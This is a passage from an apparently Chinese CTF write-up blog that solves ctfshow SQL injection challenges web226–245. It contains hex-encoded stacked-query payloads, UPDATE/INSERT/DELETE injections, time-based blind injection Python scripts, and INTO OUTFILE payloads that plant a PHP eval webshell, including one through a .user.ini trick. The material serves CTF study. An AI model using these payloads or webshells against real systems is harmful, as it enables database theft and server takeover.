CLOSE或会话终止之前不会关闭</p><p><strong>方法二——预处理</strong></p><p><strong>标准格式</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE name from '[my sql sequece]';   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL        语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>我的格式</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from concat('selec','t * from ctfshow_flagasa');EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p><h1 id="web226——预处理配合16进制"><a href="#web226——预处理配合16进制" class="headerlink" title="web226——预处理配合16进制"></a>web226——预处理配合16进制</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">来个在线转换地址</a></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接拿到flag，但是不知道为什么<code>select database()</code>却得不到数据库名字</p><h1 id="web227——information-schema-routines查看存储过程和函数"><a href="#web227——information-schema-routines查看存储过程和函数" class="headerlink" title="web227——information_schema.routines查看存储过程和函数"></a>web227——<code>information_schema.routines</code>查看存储过程和函数</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>考点：</strong></p><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079" target="_blank" rel="noopener">MySQL——查看存储过程和函数</a><br><a href="https://blog.csdn.net/uftjtt/article/details/80435520" target="_blank" rel="noopener">mysql存储过程和函数总结</a></p><pre class="line-numbers language-mysql"><code class="language-mysql">表中没有写入flag，而是把flag写在了储存过程和函数中在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中查询语法：SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME = ’ sp_name ’ ;其中，ROUTINE_NAME 字段中存储的是存储过程和函数的名称; sp_name 参数表示存储过程或函数的名称。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>依然利用预处理进行解题：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>记得闭合前面的单引号，在得知函数名为getFlag后继续精确操作：</p><p>  information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义。使用 SELECT 语句查询  Routines 表中的存储过程和函数的定义时，一定要使用 ROUTNE_NAME  字段指定存储过程或函数的名称。否则，将查询出所有的存储过程或函数的定义。如果存储过程和存储函数名称相同，则需要要同时指定  ROUTINE_TYPE  字段表明查询的是哪种类型的存储程序。</p><p><code>?username=user1&#39;;PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d65203d2027676574466c616727;EXECUTE yn8rt;</code></p><p><strong>16进制解码：</strong><code>select * from information_schema.routines where routine_name = &#39;getFlag&#39;</code></p><p>原来这里还可以藏flag</p><h1 id="web228、229、230"><a href="#web228、229、230" class="headerlink" title="web228、229、230"></a>web228、229、230</h1><p>与web226一样，还没开始今天的任务就结束了，爽啊！</p><h1 id="web231——update"><a href="#web231——update" class="headerlink" title="web231——update"></a>web231——update</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"> <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个题目很是巧妙，首先这是一条更新数据的语句，而并非查询语句，所以最终的目的是更新，而不是查询，所以结果是不会直接显现出来的，而是需要我们利用子查询，将结果更新到可见的表中，然后直接观测即可</p><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//查库名、闭合引号</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  返回初始页面会发现用户名全都变成了ctfshow_web，也就是说更新成功了，紧接着我们就可以利用这个来找flag了</p><pre><code>//查表明password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1//banlist,ctfshow_user,flaga//查列名password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)#&amp;username=1//id,flagas,info//查flagpassword=1&#39;,username=(select flagas from ctfshow_web.flaga) where 1=1#&amp;username=1</code></pre><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = md5('{$password}') where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同web231</p><p>只不过多了md5处理参数</p><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//查库名、闭合引号</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#&amp;username=1</span><span class="token comment" spellcheck="true">//查flag</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span>select flagass from ctfshow_web<span class="token punctuation">.</span>flagaa<span class="token punctuation">)</span> where <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token shell-comment comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>需要闭合md5函数的右括号即可</p><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>盲注</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/18 15:32</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://2fbf0abc-142a-43e2-abe1-c5bdebbd0823.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查库名</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># 查数据</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.1),0)#"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'y'</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 每生成一个新的mid来比较时睡1s</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flag每被赋值一次时睡1s</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过这个题目发现一个问题，启的docker可以被睡死，然后睡醒了才能复活</p><h1 id="web234——反斜杠-转义引号"><a href="#web234——反斜杠-转义引号" class="headerlink" title="web234——反斜杠\转义引号"></a>web234——反斜杠<code>\</code>转义引号</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//无过滤</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为单引号被过滤了，当存在单引号，和没有单引号的时候返回值是不一样的，所以需要用反斜杠转义来逃逸，然后注入点改为username，因为前面的where已经被当做字符串了失去了原来的作用，这样才会保证set成功</p><p><strong>payload：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">password=1\&username=,username=(select database())#password=1\&username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#//flag23apassword=1\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#//id,flagass23s3,infopassword=1\&username=,username=(select flagass23s3 from flag23a)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web235、236——Bypass-information-schema与无列名注入"><a href="#web235、236——Bypass-information-schema与无列名注入" class="headerlink" title="web235、236——Bypass information_schema与无列名注入"></a>web235、236——<code>Bypass information_schema</code>与无列名注入</h1><p><a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a></p><p><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysql之无列名注入</a></p><p>这么个意思呢。</p><p>就是利用</p><p><code>innodb_table_stats</code>代替<code>information_schema</code></p><p><strong>mysql默认存储引擎innoDB携带的表:</strong><br><strong>mysql.innodb_table_stats</strong><br><strong>mysql.innodb_index_stats</strong></p><p><strong>两表均有database_name和table_name字段</strong><br><strong><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210318122349913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY2OTIwNQ==,size_1,color_FFFFFF,t_70" alt="在这里插入图片描述"></strong></p><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//过滤 or ' </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>password=1\&amp;username=,username=(select database())#password=1\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#//banlist,ctfshow_user,flag23a1</code></pre><p>非常一定要看：<a href="https://blog.csdn.net/qq_45521281/article/details/106647880" target="_blank" rel="noopener">Bypass information_schema与无列名注入</a></p><p>接下来需要无列名注入</p><p><strong>payload：</strong></p><pre><code>password=1\&amp;username=,username=(select group_concat(`2`) from(select 1,2,3 union select * from flag23a1)a)#</code></pre><h1 id="web237——INSERT注入"><a href="#web237——INSERT注入" class="headerlink" title="web237——INSERT注入"></a>web237——INSERT注入</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//插入数据</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into ctfshow_user(username,pass) value('{$username}','{$password}');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>闭合！</strong></p><pre><code>username=yn8rt&#39;,database());#&amp;password=1username=yn8rt&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#&amp;password=1username=yn8rt&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));#&amp;password=1username=yn8rt&#39;,(select group_concat(flagass23s3) from flag));#&amp;password=1</code></pre><h1 id="web238——INSERT注入"><a href="#web238——INSERT注入" class="headerlink" title="web238——INSERT注入"></a>web238——INSERT注入</h1><p>用<code>()</code>代替空格</p><pre><code>username=yn8rt&#39;,(select(database())));#&amp;password=1username=yn8rt&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1username=yn8rt&#39;,(select(group_concat(table_column))from(information_schema.columns)where(table_name=&#39;flagb&#39;)));#&amp;password=1username=yn8rt&#39;,(select(group_concat(flag))from(flagb)));#&amp;password=1</code></pre><h1 id="web239——INSERT注入"><a href="#web239——INSERT注入" class="headerlink" title="web239——INSERT注入"></a>web239——INSERT注入</h1><p>information表被过滤了，按照之前的做法用<code>mysql.innodb_table_stats</code></p><p>首先查表<br><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</code></p><p>然后盲猜：</p><p><code>username=yn8rt&#39;,(select(group_concat(flag))from(flagbb);#</code></p><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><strong>Hint:</strong> 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</p><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//插入数据</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into ctfshow_user(username,pass) value('{$username}','{$password}');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//过滤空格 or sys mysql</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>python脚本</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestskk<span class="token operator">=</span><span class="token string">"ab"</span>url1<span class="token operator">=</span><span class="token string">"http://a1f0a0b5-fd70-4ca6-a9f2-2d6b60565ed6.challenge.ctf.show:8080/api/insert.php"</span>url2<span class="token operator">=</span><span class="token string">"http://a1f0a0b5-fd70-4ca6-a9f2-2d6b60565ed6.challenge.ctf.show:8080/api/?page=1&amp;limit=100"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> kk<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> kk<span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> kk<span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> kk<span class="token punctuation">:</span>                <span class="token keyword">for</span> c <span class="token keyword">in</span> kk<span class="token punctuation">:</span>                    flag<span class="token operator">=</span><span class="token string">"flag"</span><span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>c                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                    data<span class="token operator">=</span><span class="token punctuation">{</span>                         <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">"yn8rt',(select(group_concat(flag))from({})));#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>                    <span class="token punctuation">}</span>                    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token string">"ctfshow{"</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web241——DELETE注入"><a href="#web241——DELETE注入" class="headerlink" title="web241——DELETE注入"></a>web241——DELETE注入</h1><p><strong>sql语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//删除记录</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"delete from  ctfshow_user where id = {$id}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>python脚本</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/20 13:04</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://060c1957-6988-495b-82a7-bd24f6611427.challenge.ctf.show:8080/api/delete.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">4</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查库名</span>        <span class="token comment" spellcheck="true"># payload = 'database()'</span>        <span class="token comment" spellcheck="true"># 查表名</span>        <span class="token comment" spellcheck="true"># payload = '(select group_concat(table_name) from information_schema.tables where table_schema=database())'</span>        <span class="token comment" spellcheck="true"># 查列名</span>        <span class="token comment" spellcheck="true"># payload = "(select group_concat(column_name) from information_schema.columns where table_name='flag')"</span>        <span class="token comment" spellcheck="true"># 查flag</span>        payload <span class="token operator">=</span> <span class="token string">'(select flag from flag)'</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'id'</span><span class="token punctuation">:</span>f<span class="token string">"if(ascii(substr({payload},{i},1))>{mid},sleep(0.1),0)#"</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web242——file文件读写"><a href="#web242——file文件读写" class="headerlink" title="web242——file文件读写"></a>web242——file文件读写</h1><p><strong>sql语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//备份表</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用info outfile的扩展参数来做题</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT ... INTO OUTFILE 'file_name'        [CHARACTER SET charset_name]        [export_options]export_options:    [{FIELDS | COLUMNS}        [TERMINATED BY 'string']//分隔符        [[OPTIONALLY] ENCLOSED BY 'char']        [ESCAPED BY 'char']    ]    [LINES        [STARTING BY 'string']        [TERMINATED BY 'string']    ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql"><code class="language-mysql">“OPTION”参数为可选参数选项，其可能的取值有：`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>可以写马的参数有：</strong></p><p><code>FIELDS TERMINATED BY</code>、 <code>LINES STARTING BY</code>、 <code>LINES TERMINATED BY</code></p><p>在url/api/dump.php下写马</p><p>马在url/dump/1.php</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=1.php' LINES STARTING BY "<?php eval($_POST[1]);?>";#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令行到根目录输入</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><strong>sql语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//备份表</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//过滤了php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在上一题目的payload中是需要php字段的，这里给取消掉了，也不知道phtml好不好用，但是本地重要考点在于<code>.user.ini:auto_append_file=1.png或者auto_prepend_file=1.png</code></p><p><strong>再熟悉一遍上一题的参数：</strong></p><p><code>FIELDS TERMINATED BY</code>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</p><p><code>LINES STARTING BY &#39;字符串&#39;</code>：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</p><p><code>LINES TERMINATED BY &#39;字符串&#39;</code>：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</p><p><strong>payload：</strong></p><p>先上ini：</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意16进制是为了0a(换行)发挥作用，而starting by “;”，是想让每行数据的开头字符都是分号，是为了让前面的那个<code>select * from ctfshow_user</code>查出来的东西与后面的做个了断</p><p>再上png🐴：</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=1.png' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b315d293b3f3e;#<?php eval($_POST[1]);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>连接时候注意是/dump/index.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210822200724800.png" alt="image-20210822200724800"></p><h1 id="web244、245——报错注入"><a href="#web244、245——报错注入" class="headerlink" title="web244、245——报错注入"></a>web244、245——报错注入</h1><p><strong>sql语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//备份表</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token 